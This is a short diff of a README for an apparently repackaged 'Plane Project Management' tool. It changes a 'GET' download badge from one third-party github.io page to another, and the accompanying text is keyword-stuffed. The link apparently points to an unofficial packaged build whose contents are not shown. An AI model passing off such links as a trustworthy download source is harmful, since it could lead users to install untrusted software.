@@ -120,7 +120,7 @@ Plane itself wants Docker or a Node plus Python env, Postgres, and Redis. The pl
 
 ## Download
 
-[![GET Plane Project Management](https://img.shields.io/badge/GET-Plane%20Project%20Management-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://cooperwilliam3374.github.io/.github/Plane-Project-Management)
+[![GET Plane Project Management](https://img.shields.io/badge/GET-Plane%20Project%20Management-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://plane-project-management-docker.github.io/Plane-Project-Management/)
 
 Use the GET badge for the packaged Plane Project Management build. That is the plane project management docker path most people want. Cloud signup is the other door.
 
